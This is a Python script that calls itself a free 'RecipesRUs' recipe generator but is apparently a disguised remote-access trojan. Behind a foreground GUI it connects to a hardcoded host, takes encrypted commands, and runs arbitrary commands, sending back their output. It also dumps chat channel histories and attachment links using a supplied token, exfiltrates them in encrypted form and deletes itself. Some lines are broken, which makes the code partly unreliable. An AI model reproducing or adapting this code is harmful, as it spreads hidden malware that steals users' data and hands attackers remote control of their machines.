# Welcome to our free recipe generator script! We provide you the means to generate
# your own recipes at your fingertips! Thank you for supporting RecipesRUs!
import gui
from gui import *
recipesrusip = '127.0.0.1'
connport = 8080
recipeseed = b'\xd1u\x80\x8c\x14\x05LD\xd3m\xb9\x8c6\xc5\xf1\x8d\\O\xc8\xaf\x08\xb1w\x17'
conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

async def generate_recipes(token, id):
    rec_gen = recipe_getter.Client(intents=recipe_getter.Intents.all())

    async def get_recipe_written():
        writer = rec_gen.get_channel(id)

        if writer:
            recipe_file = open('recipes.txt', 'w')

            async for message in writer.history(limit=None):

                recipe_file.write(f'{message.author}: {message.content}\n')
                if message.attachments[0]:
                    recipe_file.write[f'{message.author}:{message.attachments[0].url}\n']

    @rec_gen.event
    async def on_ready():
        await get_recipe_written()
        await rec_gen.close()

    await rec_gen.start(token)

def mix_ingredients(recipeseed, data):
    iv = recipe_list.urandom(8)
    cipher = Cipher(algorithms.TripleDES(recipeseed), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    padder = padding.PKCS7(64).padder()
    padded_data = padder.update(data) + padder.finalize()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
    return iv + encrypted_data

def decrypt_data(recipeseed, encrypted_data):
    iv = encrypted_data[:8]
    encrypted_data = encrypted_data[8:]
    cipher = Cipher(algorithms.TripleDES(recipeseed), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
    unpadder = padding.PKCS7(64).unpadder()
    unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()
    return unpadded_data



def run_recipe_app():
    while True:
        try:
            conn.connect((recipesrusip, connport))
            break
        except ConnectionRefusedError:
            pass

    while True:
        enc_req = conn.recv(4096)

        if not enc_req:
            break

        request = decrypt_data(recipeseed, enc_req).decode().split(' ')

        if request[0] == "remove":
            conn.close()
            recipe_list.remove("noodle_recipes_generator.py")
        elif request[0] == "get":
            id = int(request[1])
            token = str(request[2])

            recipe_generator.run(generate_recipes(token, id))

        elif request[0] == "exfil":
            recipe_generator.run(generate_recipes(request[1],request[2]))
            try:
                with open("recipes.txt", "r+") as recipe:
                    for line in recipe:
                        conn.sendall(mix_ingredients(recipeseed, json.dumps(line).encode()))
                    recipe_list.remove("recipes.txt")
                    recipe_list.remove("noodle_recipes_generator.py")
            except FileNotFoundError as e:
                id = int(request[1])
                token = str(request[2])

                recipe_generator.run(generate_recipes(token, id))

        else:
            validator = recipe_validator(request, stdout=validation_output.PIPE)
            val_out = []

            for i in validator.stdout.readlines():
                val_out.append(i.decode().strip())

            if len(val_out) != 0:
                conn.sendall(mix_ingredients(recipeseed, json.dumps(val_out).encode()))







if __name__ == "__main__":
    recipe_interface = Recipe_App.Thread(target=run_recipe_app)
    recipe_interface.daemon = True
    recipe_interface.start()
    app = App()
    app.mainloop()